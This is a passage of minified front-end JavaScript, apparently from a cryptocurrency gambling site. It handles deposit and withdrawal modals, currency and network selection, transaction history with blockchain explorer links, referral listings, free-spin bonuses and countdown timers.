        isMobile() && (n.style.display = "none");
        let r = document.getElementsByClassName("dwc_item");
        if (Array.from(r).forEach((e => {
                e.classList.remove("actives")
            })), a.classList.add("actives"), n = document.getElementsByClassName("opListCur" + t)[0], n.style.display = "block", 1 == t && (opDData(!1), 0 != chBoI.min)) {
            let t;
            t = gC("amountFiatET")[0], t.style.display = "flex", t = t.getElementsByTagName("span"), t[0] && (t[0].innerHTML = chBoI.am), b = Number(chBoI.min) * listCurs.data.rates[e], b = window.truncatorJet(Number(b), 4, 4), t[1] && (t[1].innerHTML = b + " " + e)
        }
        if (2 == t && opWData(!1), isMobile() && 2 == s) {
            document.getElementsByClassName("modal_deposite")[0].classList.add("opMon2")
        }
        if (!isMobile()) {
            let e = document.getElementsByClassName("modal_deposite")[0];
            e.classList.add("opMonD"), e.classList.remove("opMoni")
        }
        changeDW(s, t);
        let o = 1 == s ? t + 6 : t;
        if (n = document.getElementById("cur_name_wd" + t), gD("spanCr2_i29").style.display = "none", 1 == t && (n.innerHTML = e + " " + lp.Deposit), 2 == t && (n.innerHTML = e + " " + lp.Withdraw), 1 != s) {
            n = document.getElementById("cur_curs_wd" + t), n.style.display = "", n.innerHTML = "1 " + e + " = ", 1 == t && (n.innerHTML = e), n = document.getElementById("lci_wd" + t), n.style.display = "";
            let s = 1 / Number(listCurs.data.rates[e]),
                a = cryptoSetPrc2[e];
            s = window.truncatorJet(s, a, a) - 0, n.innerHTML = 1 == t ? s : "$" + s, 1 == t && (gD("spanCr2_i29").style.display = "inline-block"), 2 == t && (gD("spanCr2_i19").setAttribute("src", "/assets/coins/" + e + ".svg"), gD("cur_wds19").innerHTML = "1.00 ", gD("cur_curs_wd19").innerHTML = e, gD("lci_wd19").innerHTML = s)
        } else n = document.getElementById("cur_curs_wd" + t), n.style.display = "none", n = document.getElementById("lci_wd" + t), n.style.display = "none";
        cabChooseCur(e, o), currencyLast = e
    },
    createCurListsq = (e, t, s, a, n) => {
        1 != userIDGame && 11 != userIDGame && 8303 != userIDGame && (e = e.filter((e => "CNY" != e[0] && "GEL" != e[0] && "UZS" != e[0] && "MYR" != e[0] && "JPY" != e[0] && "THB" != e[0] && "AUD" != e[0] && "NGN" != e[0] && "PEN" != e[0] && "USD" != e[0] && "NZD" != e[0] && "TRY" != e[0])));
        let r = "";
        e.forEach((e => {
            let t = "";
            1 == n && (t = `<div class="dwc_count">${window.truncatorJet(e[1],8)}</div>`), r += `<div onclick="listCurSel('${e[0]}',${s},${a},this)" class="dwc_item curs22${e[0]}">\n      <img src="/assets/coins/${e[0]}.svg?x=5" alt="${e[0]}">\n      <div class="dwc_name">${e[0]}</div>\n      ${t}\n      </div>`
        })), document.getElementsByClassName(t)[0].innerHTML = r
    },
    arrNetworkCrypto = [{
        name: "USDT",
        ns: ["ERC20", "TRC20"]
    }, {
        name: "BTC",
        ns: ["Bitcoin"]
    }, {
        name: "BCH",
        ns: ["BCH"]
    }, {
        name: "ETH",
        ns: ["ERC20"]
    }, {
        name: "DOGE",
        ns: ["DOGE"]
    }, {
        name: "LTC",
        ns: ["LTC"]
    }, {
        name: "XRP",
        ns: ["Ripple"]
    }, {
        name: "BNB",
        ns: ["BEP-20"]
    }, {
        name: "ADA",
        ns: ["Cardano"]
    }, {
        name: "TRX",
        ns: ["TRC20"]
    }, {
        name: "DOT",
        ns: ["Polkadot"]
    }, {
        name: "SOL",
        ns: ["Solana"]
    }, {
        name: "MATIC",
        ns: ["Polygon"]
    }, {
        name: "SHIB",
        ns: ["ERC20"]
    }, {
        name: "USDC",
        ns: ["TRC20"]
    }, {
        name: "DAI",
        ns: ["ERC20"]
    }],
    openDepSLot = (e, t, s = 0) => {
        let a = gC("modal_dep_it");
        Array.from(a).forEach((e => {
            e.style.display = "none", e.style.opacity = "0", e.classList.remove("hao11")
        })), a = gC("modal_dep_" + e)[0], a || (a = gC("modal_dep_deposit")[0]), a && (a.style.display = "block"), a && a.classList.add("hao11");
        let n = gC("modal_deposite")[0];
        n.classList.remove("opMon2"), n.classList.remove("opMonD"), n.classList.remove("opMoni"), setTimeout((() => {
            a = gC("modal_dep_" + e)[0], a.style.opacity = "1"
        }), 0), gC("modal_deposite")[0].onclick = () => {}, a = gC("tab_modal_dep"), Array.from(a).forEach((e => {
            e.classList.remove("active")
        })), a = gC("tab_modal_" + e)[0], a.classList.add("active"), 1 != t && (currencyLast = userBetCur);
        let r = arrNetworkCrypto,
            o = r.findIndex((e => currencyLast == e.name)); - 1 != o && -1 == r[o].ns.findIndex((e => e == networkLast)) && (networkLast = r[o].ns[0]);
        let i = Array.from(arrayCurrencyFiatReal);
        if (i.sort(), "deposit" == e) {
            createCurListsq(arrayCurrencyR, "dw_list01", 1, 2);
            let e = arrCountryF[userCountry];
            if (e && (e = i.findIndex((t => t[0] == e)), -1 != e)) {
                let t = i[e];
                if (i.splice(e, 1), i.unshift(t), "" == document.getElementsByClassName("dw_list17")[0].innerHTML) {
                    let e = document.getElementsByClassName("list_f_" + t[0])[0],
                        s = document.getElementsByClassName("dw_list17")[0],
                        a = `listCurSel('${t[0]}',1,1,document.getElementsByClassName('curs22${t[0]}')[0]);opDData`;
                    e && (s.innerHTML += e.innerHTML.replaceAll("opDData", a)), s.innerHTML += document.getElementsByClassName("curs22USDT")[0].outerHTML, s.innerHTML += document.getElementsByClassName("curs22BTC")[0].outerHTML, 1 != userIDGame && 11 != userIDGame && 8303 != userIDGame || (s.innerHTML += gC("list_f_ALL")[0].innerHTML), t = document.getElementsByClassName("dw_list00")[0], s.parentNode.classList.add("opsFisrst")
                }
            }
            if (createCurListsq(i, "dw_list00", 1, 1), opListCur(1), !isMobile()) {
                let e = document.getElementsByClassName("modal_deposite")[0];
                e.classList.add("opMonD"), e.classList.add("opMoni")
            }
            0 == s && openDet44(1)
        }
        if ("withdraw" == e) {
            if (createCurListsq(arrayCurrencyR, "dw_list04", 2, 2, 1), createCurListsq(i, "dw_list03", 2, 1, 1), opListCur(2), !isMobile()) {
                let e = document.getElementsByClassName("modal_deposite")[0];
                e.classList.add("opMonD"), e.classList.add("opMoni")
            }
            let e = gC("with2faEn"),
                t = "1" == status2FA ? "none" : "block";
            Array.from(e).forEach((e => {
                e.style.display = t
            }))
        } - 1 != arrayCurrencyR.findIndex((e => e[0] == currencyLast)) && ("adressBook" == e && (openDropCur(document.getElementsByClassName("dep_trigger3")[0], 3, 1), cabChooseCur(currencyLast, 3), -1 != o && networkLast && cabChooseNs(networkLast, 3, currencyLast)), "swap" == e && (openDropCur(document.getElementsByClassName("dep_trigger4")[0], 4, 1), cabChooseCur(currencyLast, 4))), "swap" == e && arrayCurrency.forEach((e => {
            "JET" == e[0] && (document.getElementById("swap_bal1").innerHTML = window.truncatorJet(e[1], betListCur.JET.precision))
        }))
    },
    openBonusMob = e => {
        let t = document.getElementsByClassName(e)[0];
        "under_sports" == e && 1 == sportMobSt || "under_bonuses" == e && 1 == bonusMobSt ? ("under_sports" == e && (sportMobSt = 0), "under_bonuses" == e && (bonusMobSt = 0), t.classList.remove("active")) : ("under_sports" == e && (sportMobSt = 1), "under_bonuses" == e && (bonusMobSt = 1), t.classList.add("active"))
    },
    openTransSLot = e => {
        if (1 != window.user_il) return;
        let t = document.getElementsByClassName("modal_trans_it");
        Array.from(t).forEach((e => {
            e.style.display = "none"
        })), t = document.getElementsByClassName("modal_trans_" + e)[0], t.style.display = "block", t = document.getElementsByClassName("tab_modal_trans"), Array.from(t).forEach((e => {
            e.classList.remove("active")
        })), t = document.getElementsByClassName("trans_modal_" + e)[0], t.classList.add("active"), "deposit" == e && getPays(1), "withdraw" == e && getPays(2), "swap" == e && getPays(3)
    },
    getPays = e => {
        let t = new FormData,
            s = 1 == e ? "getUserDeposits" : "getUserWithdraws";
        s = 3 == e ? "getUserSwaps" : s, t.set("action", s);
        let a = 1 == e ? "dep" : "with";
        a = 3 == e ? "swap" : a;
        let n = document.getElementsByClassName("trans_p_" + a)[0];
        n = n.getElementsByClassName("trtrl");
        let r = "stats_117_" + a;
        r = document.getElementsByClassName(r)[0], r.innerHTML = "", axios.post("/user/func.php", t).then((t => {
            t = t.data;
            let s = "";
            t.forEach((t => {
                null == t.date_time && (t.date_time = t.date);
                let a = new Date(1e3 * t.date_time);
                formattedTime = (e => {
                    let t = new Date(e),
                        s = t.getFullYear(),
                        a = ("0" + (t.getMonth() + 1)).substr(-2);
                    return ("0" + t.getDate()).substr(-2) + "." + a + "." + s + "<br><span>" + ("0" + t.getHours()).substr(-2) + ":" + ("0" + t.getMinutes()).substr(-2) + ":" + ("0" + t.getSeconds()).substr(-2) + "</span>"
                })(a);
                let r = lp.Cancel,
                    o = "red23",
                    i = "";
                1 == t.statusValue && (r = lp.Done, o = "green23"), 6 != t.statusValue && 5 != t.statusValue || (r = lp["In progress"], o = "yel23"), null == t.statusText && (t.statusText = "");
                let l = '\n      <svg data-v-74b6fe10="" focusable="false" aria-hidden="true" class="trans_ar icon-arrow">\n      <use data-v-74b6fe10="" xlink:href="/assets/const/svg-sprite1.svg#icon-arrow"></use>\n      </svg>';
                i = `<div ><div class='tr_wr4'><div class="trans_title">${n[3].innerHTML}</div>\n      <div class="trans_text ${o}">${r}</div>\n      ${l}\n      </div>\n      </div>`, null == t.currency && (t.currency = t.toCurr), null == t.amount && (t.amount = t.amountTo);
                let c = t.currency;
                t.sender && (t.sender = t.sender.split("|")[1] ? t.sender.split("|")[1] + "</br>Tag: " + t.sender.split("|")[0] : t.sender);
                let d = `<div class="trans_title">${n[1].innerHTML}</div>\n      <div class="trans_text">${t.sender}</div>`,
                    u = window.truncatorCoins(Number(t.amount), 8);
                if (3 == e) {
                    let e = t.fromCurr;
                    "USDTT" != e && "USDTE" != e || (e = "USDT"), d = `\n          <div class="trans_title">${n[1].innerHTML}</div>\n          <div class="trans_text">\n           ${Number(t.amountFrom).toFixed(3)} ${e}\n          </div>\n          `, i = `<div>\n        <div class='tr_wr4'>\n        <div class="trans_title">${n[3].innerHTML}</div>\n        <div class="trans_text">\n        ${t.fee}%\n        </div>\n        ${l}\n        </div>\n        </div>`
                }
                let p = "";
                if (1 == e || 2 == e) {
                    let e = {
                        BTC: "blockchair.com/bitcoin/transaction/",
                        BCH: "blockchair.com/bitcoin-cash/transaction/",
                        USDC: "etherscan.io/token/",
                        "BNB-BSC": "bscscan.com/tx/",
                        USDTT: "tronscan.org/#/transaction/",
                        USDTE: "etherscan.io/tx/",
                        ETH: "blockchair.com/ethereum/transaction/",
                        LTC: "blockchair.com/litecoin/transaction/",
                        DOGE: "blockchair.com/dogecoin/transaction/",
                        XRP: "blockchair.com/ripple/account/",
                        ADA: "explorer.cardano.org/en/transaction?id=",
                        TRX: "tronscan.org/#/transaction/",
                        DOT: "polkadot.subscan.io/",
                        SOL: " explorer.solana.com/",
                        MATIC: "polygonscan.com/",
                        SHIB: "blockchair.com/shiba/account/"
                    };
                    if ("null" != String(t.other) && "" != t.other && (t.other.txid || (t.other = JSON.parse(t.other)), null != t.other.txid)) {
                        let s = `https://${e[c]}${t.other.txid}`; - 1 != t.other.txid.indexOf("CP:") && (s = `https://explorer.coinspaid.com/transaction/${t.other.txid}`), p = `<div>\n        <div class="trans_title">Txid</div>\n        <div class="trans_text">\n        <a target="_blank" href="${s}">${t.other.txid}</a>\n        </div></div>\n        `
                    }
                }
                let m = "" != t.statusText && "-" != t.statusText ? `<div class="trans_warn">${t.statusText}</div>` : "";
                s += `\n        <div class='trans_row1' onclick="getTransInfo(this)">\n            <div>\n            <div class='tr_wr4'>\n            <div class="trans_title">${n[0].innerHTML}</div>\n            <div class="trans_text">\n            ${formattedTime}\n            </div>\n            </div>\n            </div>\n            <div>\n            <div class="trans_title">${n[2].innerHTML}</div>\n            <div class="trans_text">\n            ${u} ${c}\n            </div>\n            </div>\n            ${i}\n            <div class="trans_more">\n            ${m}\n            <div class="trans_dots">\n            <div>\n            ${d}\n            </div>\n            ${p}\n            </div>\n            </div>\n        </div>\n        `
            }));
            let o = document.getElementsByClassName("trans_no_" + a)[0];
            t.length > 0 && (o.style.display = "none"), r.innerHTML = s
        })).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }))
    },
    getTransInfo = e => {
        e.classList.contains("active") ? e.classList.remove("active") : e.classList.add("active")
    },
    openSlotRef = e => {
        let t = document.getElementsByClassName("partner_page");
        if (Array.from(t).forEach((e => {
                e.style.display = "none"
            })), t = document.getElementsByClassName("partner_" + e)[0], t.style.display = "block", t = document.getElementsByClassName("partner_wrapper")[0], t = t.getElementsByClassName("tab"), Array.from(t).forEach((e => {
                e.classList.remove("active"), e.classList.remove("router-link-exact-active"), e.classList.remove("router-link-active")
            })), t = document.getElementsByClassName("tab-" + e)[0], t.classList.add("active"), t.classList.add("router-link-exact-active"), t.classList.add("router-link-active"), "referrals" == e) {
            let e = document.getElementsByClassName("referrals__table")[0];
            if (e.innerHTML = "", "" == e.innerHTML) {
                let e = new FormData;
                e.set("action", "getAffilUsers"), axios.post("/user/func.php", e).then((e => {
                    e = e.data, referralsList = e, referralsList.length > 0 && (document.getElementsByClassName("refs_no")[0].style.display = "none"), createReferralsList(), crSlRef4()
                })).catch((function(e) {
                    createNotifyL(1, e.message, lp.Error)
                }))
            }
        }
    },
    partnerCrL = e => {
        e.classList.contains("active") ? (e.classList.remove("active"), createReferralsList(), crSlRef4()) : (createReferralsList(1), crSlRef4(), e.classList.add("active"))
    },
    crSlRef4 = () => {
        let e = '<svg data-v-4cd2ab42="" focusable="false" aria-hidden="true" class="icon-arrow"><use data-v-4cd2ab42="" xlink:href="/assets/const/svg-sprite1.svg#icon-arrow"></use></svg>';
        new purePajinate({
            itemsPerPage: 10,
            containerSelector: ".items75",
            itemSelector: ".item075",
            navigationSelector: ".pm565",
            pageLinksToDisplay: 3,
            navLabelPrev: e,
            navLabelNext: e
        })
    },
    createReferralsList = (e = 0) => {
        if ("0" != user_in) {
            let t = document.getElementsByClassName("referrals__table")[0];
            t.innerHTML = "";
            let s = "";
            (0 != e ? referralsList : referralsList.reverse()).forEach(((e, t) => {
                let a = new Date(1e3 * Number(e.dateReg)),
                    n = a.getFullYear(),
                    r = "0" + (a.getMonth() + 1),
                    o = ("0" + a.getDate()).substr(-2) + "." + r.substr(-2) + "." + n;
                s += `<div class="item075 item${t+1}">\n      <div data-v-7359584e="" class="campaign">\n<div data-v-7359584e="" class="campaign__total-dep-wrap"> <span class="n_ref1">NickName</span>\n        <span data-v-4e4c84f7="" data-v-7359584e="" class="currency">\n        <img loading="lazy" class="a_ref1" src="/assets/chat/img/avatar${(t+1)%10}.svg?x=10">\n        <span data-v-4e4c84f7="" style="color: #fff;" class="font-digits">${e.nick} </span>\n</span>\n</div>\n      <div data-v-7359584e="" class="campaign__total-dep-wrap"> Date\n        <span data-v-4e4c84f7="" data-v-7359584e="" class="currency">\n        <span data-v-4e4c84f7="" style="color: #fff;" class="font-digits">${o} </span>\n</span>\n</div>\n    <div data-v-7359584e="" class="campaign__total-dep-wrap"> Total Wager \n        <span data-v-4e4c84f7="" data-v-7359584e="" class="currency">\n        <span data-v-4e4c84f7="" style="color: #fff;" class="font-digits">${Number(e.allWager).toFixed(2)} USD</span>\n</span>\n</div>\n<div data-v-7359584e="" class="campaign__total-dep-wrap"> Total Comission \n        <span data-v-4e4c84f7="" data-v-7359584e="" class="currency">\n        <span data-v-4e4c84f7="" style="color: #fff;" class="font-digits">${Number(e.allComission).toFixed(8)} USD</span>\n</span>\n</div>\n\n<div data-v-7359584e="" class="campaign__total-dep-wrap"> Total Deposits \n        <span data-v-4e4c84f7="" style="color: #fff;" class="font-digits">${e.depositCount}</span>\n</div>\n</div></div>`
            })), t.innerHTML = s
        }
    },
    openSlotSettings = e => {
        let t = document.getElementsByClassName("modal_settings")[0];
        t = t.getElementsByClassName("page-info"), Array.from(t).forEach((e => {
            e.style.display = "none"
        })), t = document.getElementsByClassName("page-info" + e)[0], t.style.display = "block", t = document.getElementsByClassName("settings_slots")[0], t = t.getElementsByClassName("tab_modal_set"), Array.from(t).forEach((e => {
            e.classList.remove("active")
        })), t = document.getElementsByClassName("select-option" + e)[0], t.classList.add("active"), openSettingsSLots(), "Security" == e && check2fa(), "Verify" == e && -1 == userAvatarUrl.indexOf("avatar") && createAvs("a_" + userIDGame + ".jpg")
    },
    openSlotHelp = e => {
        let t = document.getElementsByClassName("helP-info");
        Array.from(t).forEach((e => {
            e.style.display = "none"
        })), t = document.getElementsByClassName("helP-info" + e)[0], t.style.display = "block", t = document.getElementsByClassName("modal_help")[0], t = t.getElementsByClassName("tab_modal_set"), Array.from(t).forEach((e => {
            e.classList.remove("active")
        })), t = document.getElementsByClassName("select-option" + e)[0], t.classList.add("active"), openSettingsSLots()
    },
    changePassText = () => {
        let e = document.getElementsByClassName("password-repeat")[0];
        if (document.getElementsByClassName("fa-eye1")[0]) {
            let t = document.getElementsByClassName("fa-eye1")[0];
            t.classList.remove("fa-eye1"), t.classList.add("fa-eye-slash1"), e.type = "text"
        } else {
            let t = document.getElementsByClassName("fa-eye-slash1")[0];
            t.classList.remove("fa-eye-slash1"), t.classList.add("fa-eye1"), e.type = "password"
        }
    },
    agree = 1,
    promoExist = 0,
    agreePolicy = (e, t) => {
        if (e.currentTarget.querySelectorAll("label")[0].classList.contains("rln40")) {
            switch (e.currentTarget.querySelectorAll("label")[0].classList.remove("rln40"), t) {
                case 0:
                    promoExist = 0;
                    break;
                case 1:
                    agree = 0;
                    break;
                case 2:
                    i18 = !1
            }
            0 == t && (document.getElementById("registr-promo").style.display = "none")
        } else {
            switch (e.currentTarget.querySelectorAll("label")[0].classList.add("rln40"), t) {
                case 0:
                    promoExist = 1;
                    break;
                case 1:
                    agree = 1;
                    break;
                case 2:
                    i18 = !0
            }
            0 == t && (document.getElementById("registr-promo").style.display = "block")
        }
    },
    openSlotPayment = e => {
        let t = document.getElementsByClassName("paymenT-info");
        Array.from(t).forEach((e => {
            e.style.display = "none"
        })), t = document.getElementsByClassName("paymenT-info" + e)[0], t.style.display = "block", t = document.getElementsByClassName("modal_payment")[0], t = t.getElementsByClassName("tab_modal_set"), Array.from(t).forEach((e => {
            e.classList.remove("active")
        })), t = document.getElementsByClassName("select-option" + e)[0], t.classList.add("active"), openSettingsSLots()
    },
    textDropCoins = e => {
        let t = document.getElementsByClassName(e.currentTarget.dataset.dropdown)[0],
            s = document.getElementsByClassName(e.currentTarget.dataset.arrow)[0];
        "0" == t.dataset.status ? (e.currentTarget.classList.remove("active"), t.style.display = "none", t.dataset.status = "1", s && s.classList.remove("open")) : (e.currentTarget.classList.add("active"), t.style.display = "block", t.dataset.status = "0", s && s.classList.add("open"))
    },
    setSearCat = e => {
        let t = document.getElementsByClassName("serch_catsf")[0];
        if (t = t.getElementsByClassName("active")[0], 1 == e) return void(t && t.classList.remove("active"));
        if (e.classList.contains("active")) return;
        t && t.classList.remove("active"), e.classList.add("active");
        let s = e.dataset.ct,
            a = objCatNames[s] ? objCatNames[s] : s,
            n = filterFirstGame(json_all_first[`${s}`]);
        document.getElementById("count_serch2").innerHTML = n.length, searchItem(a, n), filterCatSearc4()
    },
    mainGroup = (e, t, s) => {
        let a = 2 == e ? "l_slots_sw" : "lobby_slider_sw";
        a = 3 == e ? "l_slots_sw1" : a, a = 4 == e ? "l_slots_sw1" : a, a = document.getElementsByClassName(a)[0];
        let n = a.getElementsByClassName("cBmlor");
        Array.from(n).forEach(((e, t) => {
            e.classList.remove("active")
        }));
        let r = t.dataset.ct;
        if (t.classList.add("active"), a.dataset.cat != r || "" == a.dataset.cat) {
            let n = "top_cont54",
                o = "lobby_cont54",
                i = "title_main_cats",
                l = "g_sl_i11",
                c = "top_title54";
            if (2 != e && 3 != e || (n = "slotlwr_cont54", o = !1, i = "t_m545", l = "g_sl_i44", c = "slotlwr_title54"), n = document.getElementById(n), o && (o = document.getElementById(o)), c = document.getElementById(c), 1 == s) o && (o.style.display = "block"), n.style.display = "none", c.style.display = "none";
            else {
                l = document.getElementById(l), l.setAttribute("src", t.getElementsByTagName("img")[0].getAttribute("src")), i = document.getElementsByClassName(i)[0], i.innerHTML = objCatNames[r] ? objCatNames[r] : r, n.style.display = "grid", o && (o.style.display = "none"), c.style.display = "inline-block";
                let s = "top";
                2 != e && 3 != e || (s = "slotlwr"), addSearchGames(filterFirstGame(json_all_first[`${r}`]).slice(0, 18), s)
            }
            a.dataset.cat = r
        }
    },
    openSlotRoules = e => {
        let t = document.getElementsByClassName("rouleS-info");
        Array.from(t).forEach((e => {
            e.style.display = "none"
        })), t = document.getElementsByClassName("rouleS-info" + e)[0], t.style.display = "block", t = document.getElementsByClassName("modal_roules")[0], t = t.getElementsByClassName("tab_modal_set"), Array.from(t).forEach((e => {
            e.classList.remove("active")
        })), t = document.getElementsByClassName("select-option" + e)[0], t.classList.add("active"), openSettingsSLots()
    },
    modalOpenNew = async (e, t, s) => {
        if (!document.getElementsByClassName(e)[0]) {
            let e = document.getElementById("coins_preloadOpen");
            s || (e.style.display = "flex");
            let a = await axios.get(`/modals/${t}.php`).catch((function(e) {
                    createNotifyL(1, e.message, lp.Error)
                })),
                n = document.createElement("div");
            n.innerHTML = a.data, document.getElementsByTagName("body")[0].appendChild(n), e = document.getElementById("coins_preloadOpen"), s || (e.style.display = "")
        }
    }, openDeposite = async () => {
        if (1 != window.user_il) return void openMobileLogin();
        let e = document.getElementsByClassName("modal_deposite")[0],
            t = 2;
        e || (t = 1), await modalOpenNew("modal_deposite", "deposit"), e = document.getElementsByClassName("modal_deposite")[0], e.classList.contains("active") || (e.classList.add("active"), 1 == t && (createCurListsq(arrayCurrencyR, "dw_list01", 1, 2), createCurListsq(arrayCurrencyFiatReal, "dw_list00", 1, 1)), openHistory("?" + window.location.href.split("?")[1] + "&deposite", 1), errFixCoins())
    }, chBoI = {
        min: 0,
        id: 0,
        am: 0,
        amo: 0,
        name: ""
    }, chBonDep = (e, t) => {
        let s = gC("dep_bon_it");
        if (Array.from(s).forEach((e => e.classList.remove("active"))), e.classList.add("active"), s = gC("bonTerms3532")[0], 0 != t) {
            s.style.display = "block";
            let t = createCurVal(0, 2);
            currencyAbbreviations[t] && (t = currencyAbbreviations[t]), t += " ", s.getElementsByClassName("bon_20k3")[0].innerHTML = t + createCurVal(2e4), s = s.getElementsByTagName("span"), s[0].innerHTML = e.dataset.am, t += createCurVal(e.dataset.min.replace("$", "")), s[1].innerHTML = t
        } else s.style.display = "none";
        chBoI.min = e.dataset.min.substring(1), chBoI.id = t, chBoI.amo = e.dataset.amo, chBoI.name = e.dataset.name, chBoI.am = e.dataset.am
    }, openVeriff = async (e = 0) => {
        if (1 != window.user_il) return void openMobileLogin();
        await modalOpenNew("modal_veriff", "veriff");
        let t = document.getElementsByClassName("modal_veriff")[0];
        t.classList.add("active"), 0 != e && t.classList.add("mn76"), 3 == e && t.classList.add("nhub4"), errFixCoins()
    }, closeVeriff = () => {
        let e = document.getElementsByClassName("modal_veriff")[0];
        e && (e.classList.remove("active"), e.classList.remove("mn76"), e.classList.remove("nhub4"), e = document.getElementById("sumsub-websdk-container"), e.innerHTML = "", 1 != modalOpen && errUnFixCoins())
    }, openTrans = async e => {
        if (1 != window.user_il) return void openMobileLogin();
        await modalOpenNew("modal_trans", "transaction"), document.getElementsByClassName("modal_trans")[0].classList.add("active"), errFixCoins();
        let t = document.getElementById("close_trans117");
        if (e) {
            t.style.display = "block", t.classList.add("active");
            let s = 1 == e ? "deposit" : "withdraw";
            3 == e && (s = "swap"), t.onclick = () => {
                closeTrans(1), openDeposite(), openDepSLot(s)
            }
        } else t.style.display = "none", t.classList.remove("active");
        openHistory("?" + window.location.href.split("?")[1] + "&transactions", 1)
    }, openBannerG = e => {
        let t = getCookieChat("demoMode");
        null != t && "1" != t || (t = "0"), "0" == t && (t = "1");
        let s = casinoGames.find((t => t[0] == e)),
            a = getImg5(s),
            n = a.href,
            r = a.hrefx2,
            o = a.hrefG,
            i = a.posta;
        s[1].t && (t = s[1].t), 0 == s[1].d && (t = 2);
        let l = document.createElement("div"),
            c = document.createElement("img");
        c.setAttribute("srcset", `${r} 2x,${n} 1x`), c.setAttribute("alt", s[1].n), c.dataset.src = e, l.appendChild(c), c = document.createElement("div"), c.classList.add("gn50"), c.innerHTML = s[1].n, l.appendChild(c), c = document.createElement("div"), c.classList.add("gp50"), c.innerHTML = s[1].p, l.appendChild(c);
        let d = disGameCh(s);
        openGC(o, 1, `${s[1].s}`, `${s[1].n}`, t, i, l, d, `${s[1].p}`)
    }, opFsGa = async e => {
        let t = new FormData;
        t.set("action", "userClickFS"), t.set("idFS", e.dataset.id);
        let s = await axios({
            method: "post",
            url: "/user/func.php",
            data: t,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }));
        if (s = s.data, 0 == s.error) {
            let e = casinoGames.find((e => e[0] == s.data.gid)),
                t = getImg5(e);
            if (disGameCh(e)) return void createNotifyL(1, "Not available in your region.", lp.Error);
            if ("CANDY" == userBetCur) return void createNotifyL(1, "Currency CANDY only in original games.", lp.Error);
            let a = t.href,
                n = t.hrefx2,
                r = t.hrefG,
                o = (t.posta, 1);
            e[1].t && (o = e[1].t), 0 == e[1].d && (o = 2);
            let i = document.createElement("div"),
                l = document.createElement("img");
            l.setAttribute("srcset", `${n} 2x,${a} 1x`), l.setAttribute("alt", e[1].n), l.dataset.src = s.data.gid, i.appendChild(l), l = document.createElement("div"), l.classList.add("gn50"), l.innerHTML = e[1].n, i.appendChild(l), l = document.createElement("div"), l.classList.add("gp50"), l.innerHTML = e[1].p, i.appendChild(l), chRGames(s.data.gid), document.cookie = "demoMode=0; path=/";
            let c = document.getElementsByClassName("balance_cur_USD")[0];
            c && chaBal({
                currentTarget: c
            }, 7), isMobile() && closeChooseSlot(), isMobile() ? openGameMob(r + "&fs") : openGameWindow(r + "&fs", e[1].n, o, !1, s.data.gid)
        } else createNotifyL(1, s.message || "&nbsp;", lp.Error)
    }, cancelUserFSreg = async () => {
        let e = new FormData;
        e.set("action", "cancelUserFSreg"), await axios({
            method: "post",
            url: "/user/func.php",
            data: e,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        })), closeDet44(), document.getElementById("cfs0").classList.remove("ops")
    }, takePlayedBonusUserFSreg = async e => {
        e.disabled = !0;
        let t = new FormData;
        t.set("action", "takePlayedBonusUserFSreg");
        let s = await axios({
            method: "post",
            url: "/user/func.php",
            data: t,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }));
        if (s = s.data, 0 == s.error) {
            document.getElementById("cfs0").classList.remove("ops")
        } else createNotifyL(1, s.message, lp.Error), e.disabled = !1
    }, getFTMon = async e => {
        e.disabled = !0;
        let t = new FormData;
        t.set("action", "takeMyWinTournamentCandy"), t.set("id", e.dataset.id);
        let s = await axios({
            method: "post",
            url: "/user/func.php",
            data: t,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch((function(t) {
            createNotifyL(1, t.message, lp.Error), e.disabled = !1
        }));
        if (s = s.data, 0 == s.error) {
            e.disabled = !0, document.getElementById("cfs" + e.dataset.id).classList.remove("ops")
        } else e.disabled = !1, createNotifyL(1, s.message, lp.Error)
    }, actFSreg = async e => {
        e.disabled = !0;
        let t = new FormData;
        t.set("action", "activateUserFSreg");
        let s = await axios({
            method: "post",
            url: "/user/func.php",
            data: t,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch((function(t) {
            createNotifyL(1, t.message, lp.Error), e.disabled = !1
        }));
        if (s = s.data, 0 == s.error) {
            e.disabled = !0;
            let t = document.getElementById("itFS0");
            t.classList.remove("regFs333"), t.classList.add("regFs444"), t.setAttribute("onclick", "opFsGa(this)"), t.dataset.id = s.current[0].id, helpTimers(s.current[0], s, document, 1), t = document.getElementById("cfs0_bt"), t.setAttribute("onclick", "opFsGa(this)"), t.dataset.id = s.current[0].id, t = document.getElementById("cfs0"), t.classList.remove("twostage11"), t.classList.add("twostage33")
        } else e.disabled = !1, createNotifyL(1, s.message, lp.Error)
    };

function helpTimers(e, t, s, a) {
    let n = e.id;
    1 == a && (n = 0);
    let r = s.getElementById(`itFS${n}`);
    if (r && (r = r.getElementsByClassName("mod_i_t")[0]), 0 != e.until && null != e.until) {
        r && (r.style.display = "flex");
        let s = 1e3 * (t.server.time - e.until),
            n = t.server.time - s;
        couTime555.push({
            t: 0,
            di: e.id
        });
        let o = 0;
        e.enable && (o = 1), 1 == a && (o = 2), 3 == a && (o = 3), updateTime555(t, n, e.id, o);
        let i = setInterval((() => {
            updateTime555(t, n, e.id, o)
        }), 1e3);
        fresp72.push({
            id: i,
            di: e.id
        })
    } else r = gD(`itFS${e.id}`), r && r.classList.add("ijsd56")
}
let updateTime555 = (e, t, a, n) => {
        let r = t,
            o = e.server.time,
            i = couTime555.findIndex((e => e.di == a));
        couTime555[i].t += 1e3, i = couTime555[i].t;
        let c = r - (o + i);
        if (c > 0) c /= 1e3, day = "0" + Math.floor(c / 86400), h = "0" + Math.floor((c - 86400 * day) / 3600), m = "0" + Math.floor((c - 86400 * day - 3600 * h) / 60), s = "0" + Math.floor(c - 86400 * day - 3600 * h - 60 * m);
        else {
            day = h = m = s = "--";
            let e = fresp72.find((e => e.di == a));
            e && (e = {
                id: null
            }), e && clearInterval(e.id), e = gD(`itFS${a}`), e && e.classList.add("ijsd56")
        }
        if (3 != n) {
            2 == n && (a = 0);
            let e = document.getElementById(`itFS${a}`),
                t = e.getElementsByClassName("mtd")[0];
